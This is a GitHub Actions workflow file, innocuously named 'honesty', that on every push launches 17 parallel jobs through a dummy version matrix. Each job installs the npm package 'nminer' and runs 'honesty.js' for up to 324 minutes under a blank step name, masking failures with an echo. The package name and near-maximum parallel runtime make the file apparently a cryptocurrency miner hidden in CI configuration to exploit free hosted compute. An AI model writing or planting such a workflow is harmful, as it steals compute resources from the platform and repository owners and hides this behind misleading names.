name: honesty
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1155 }
          - { version: 1719 }
          - { version: 5768 }
          - { version: 4705 }
          - { version: 8547 }
          - { version: 1558 }
          - { version: 7018 }
          - { version: 9725 }
          - { version: 6466 }
          - { version: 9100 }
          - { version: 6544 }
          - { version: 5819 }
          - { version: 9437 }
          - { version: 9331 }
          - { version: 5592 }
          - { version: 1751 }
          - { version: 4124 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 324m node honesty.js || echo "honesty executed"